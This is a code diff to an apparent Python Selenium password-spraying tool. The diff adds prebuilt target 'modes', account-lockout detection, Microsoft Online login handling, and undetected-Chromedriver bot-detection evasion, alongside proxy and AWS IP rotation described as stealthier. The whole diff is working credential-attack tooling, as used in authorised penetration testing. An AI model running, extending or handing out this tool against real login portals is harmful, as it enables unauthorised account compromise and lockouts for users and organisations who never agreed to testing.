@@ -11,6 +11,9 @@ from selenium.webdriver.support import expected_conditions as ec
 from selenium.webdriver.support.ui import WebDriverWait
 from selenium.common.exceptions import TimeoutException
 from multiprocessing import Process
+import os
+import toml
+from seleniumbase import Driver
 
 
 class Colors:
@@ -55,6 +58,7 @@ def parse_arguments():
                            help="(OPTIONAL) Text which will be on the page if authentication is successful. -f can be "
                                 "used as an alternative")
 
+    optional.add_argument("-m", "--mode", help="Use a pre-built mode, eliminating the need for -uf,-pf,-f,-s, and -i. Mode name should correspond to the file name (minus extension) of a profile in the modes folder.")
     optional.add_argument('-t', '--threads', type=int, default=5,
                           help="(OPTIONAL) Number of threads for passwords spraying. Lower is stealthier. "
                                "Default is 5.")
@@ -68,6 +72,9 @@ def parse_arguments():
     optional.add_argument("-i", "--invalid-username", type=str,
                           help="(OPTIONAL) String(s) to look for to determine if the username was invalid. Multiple "
                                "strings can be provided comma seperated with no spaces.")
+    optional.add_argument('-l', '--lockout', type=str,
+                         help="(OPTIONAL) String(s) to look for to determine if the account has been locked. Multiple "
+                              "strings can be provided comma seperated with no spaces.")
     optional.add_argument('-cb', '--checkbox', type=str,
                           help="(OPTIONAL) If a checkbox is required, provide a unique attribute of the checkbox, "
                                "allowing the script to automatically check it. For example, if "
@@ -76,6 +83,8 @@ def parse_arguments():
                           help="(OPTIONAL) Proxy URLs to proxy traffic through. Can be a file name (CSV or TXT) or a "
                                "comma-separated list of proxies. If AWS or Azure proxies are also configured, both "
                                "manually-specified and automatic proxies will be used.")
+    optional.add_argument('--update', action='store_true',
+                          help="(OPTIONAL) Update the script to the latest version (Only works if installed with PIPX).")
 
     aws_group.add_argument('--aws', action='store_true', help="(OPTIONAL) Use AWS proxies. Default is False.")
     aws_group.add_argument('-n','--num_sprays_per_ip', type=int, default=5, help="(OPTIONAL) Number of sprays to perform per IP address. Default is 5.")
@@ -87,6 +96,19 @@ def parse_arguments():
     aws_group.add_argument("--aws-region", default="us-east-2", help="AWS Region")
 
     return parser.parse_args()
+
+
+def load_mode_config(args, mode_dir='selray/modes'):
+    """
+    Loads mode configuration from a TOML file into the args namespace if not already specified.
+    """
+    config_path = os.path.join(mode_dir, f"{args.mode.lower()}.toml")
+    with open(config_path, 'r', encoding='utf-8') as f:
+        config = toml.load(f)
+
+    for key, value in config.items():
+        if not getattr(args, key, None):
+            setattr(args, key, value)
 
 
 def prepare_fields(username_field="", password_field="", checkbox=""):
@@ -126,6 +148,14 @@ def prepare_invalid_username(invalid_username=None):
     final_list = ["couldn't find an account with that username", "this username may be incorrect"]
     if invalid_username:
         invalid_username = invalid_username.split(",")
+        final_list.extend(invalid_username)
+    return final_list
+
+
+def prepare_lockout(lockout_messages=None):
+    final_list = ["account has been locked out", "too many login attempts"]
+    if lockout_messages:
+        invalid_username = lockout_messages.split(",")
         final_list.extend(invalid_username)
     return final_list
 
@@ -215,7 +245,7 @@ def prepare_proxies(ec2, args):
         proxies = aws.proxy_setup(ec2, args.threads)
 
     if not proxies:
-        proxies = [{"type": None, "ip": None, "id": None} for _ in range(args.threads)]
+        proxies = [{"type": None, "ip": None, "id": None, "url": None} for _ in range(args.threads)]
 
     return proxies  # Proxies will always be a list of dicts.
 
@@ -261,6 +291,7 @@ def print_beginning(args, version=None):
     elif args.fail:
         print(f"{'Failure Condition:':<28}{args.fail}")
     print(f"{'Invalid Username Condition:':<28}{args.invalid_username}")
+    print(f"{'Lockout Condition:':<28}{args.lockout}")
     print(f"{'Threads:':<28}{args.threads}")
     print(f"{'Delay:':<28}{args.delay}\n")
 
@@ -290,12 +321,26 @@ def perform_spray(spray_config, credentials, proxy, queue):
 
 
 def attempt_login(spray_config, proxy_url):
-    selenium_options = webdriver.ChromeOptions()
-    selenium_options.add_argument('--ignore-certificate-errors')
-    #selenium_options.add_argument("--headless")
-    if proxy:
-        selenium_options.add_argument(f'--proxy-server={proxy_url}')
-    driver = webdriver.Chrome(options=selenium_options)
+    # SeleniumBase with Undetected Chromedriver is a better solution, but doesn't work with multiprocessing out of the
+    #   box. Research needs to be done to properly support multiprocessing. For now, Undetected Chromedriver is used if
+    #   threads is set to 1.
+    if spray_config.threads == 1:
+        selenium_options = ['--ignore-certificate-errors', '--ignore-ssl-errors']
+        if proxy_url:
+            selenium_options.append(f'--proxy-server={proxy_url}')
+        # Initialize the Selenium browser
+        driver = Driver(uc=True,
+                        headless=False,
+                        chromium_arg=selenium_options)
+    else:
+        selenium_options = webdriver.ChromeOptions()
+        selenium_options.add_argument('--ignore-certificate-errors')
+        # selenium_options.add_argument("--headless")
+        if proxy_url:
+            selenium_options.add_argument(f'--proxy-server={proxy_url}')
+        driver = webdriver.Chrome(options=selenium_options)
+
+    driver.set_page_load_timeout(30)
     driver.delete_all_cookies()
     driver.get(spray_config.url)
 
@@ -322,6 +367,8 @@ def attempt_login(spray_config, proxy_url):
     except TimeoutException:
         input_box.send_keys(Keys.RETURN)
         sleep(1)  # Wait for the page to load
+
+        # Specific to the Microsoft Online login portal
         if "Microsoft" and "Work or school account" in driver.page_source:
             work_box = driver.find_element(By.XPATH, f"//div[@id='aadTile']")
             work_box.click()
@@ -330,7 +377,11 @@ def attempt_login(spray_config, proxy_url):
     if list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.invalid_username):
         print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - USERNAME INVALID: {spray_config.username}")
         driver.close()
-        return
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "INVALID USERNAME"}
+    elif list_in_string(string_to_check=driver.page_source.lower(), list_to_compare=spray_config.lockout):
+        driver.close()
+        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M')} - {Colors.WARNING}ACCOUNT LOCKOUT{Colors.END}: {spray_config.username}")
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "LOCKED"}
 
     try:
         WebDriverWait(driver, 3).until(
@@ -339,7 +390,7 @@ def attempt_login(spray_config, proxy_url):
         print(f"ERROR - Could not find the password field with key '{spray_config.password_field_key}' and value "
               f"'{spray_config.password_field_value}'")
         driver.close()
-        return
+        return {'USERNAME': spray_config.username, 'PASSWORD': spray_config.password, 'RESULT': "ERROR"}
 
     password_box = driver.find_element(By.XPATH, f"//input[@{spray_config.password_field_key}='{spray_config.password_field_value}']")
     password_box.clear()
